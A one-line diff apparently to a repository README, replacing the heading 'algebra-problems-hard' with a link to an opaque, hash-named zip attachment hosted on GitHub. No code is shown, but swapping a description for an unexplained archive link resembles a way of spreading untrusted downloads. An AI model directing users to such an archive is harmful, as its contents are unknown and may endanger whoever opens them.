@@ -1,1 +1,1 @@
-# algebra-problems-hard
+[ff00b4b49669ad3dec890306d348adc4-315d16d17bca6920cd1ae9192dca647ccb3e0d5d.zip](https://github.com/user-attachments/files/17655929/ff00b4b49669ad3dec890306d348adc4-315d16d17bca6920cd1ae9192dca647ccb3e0d5d.zip)
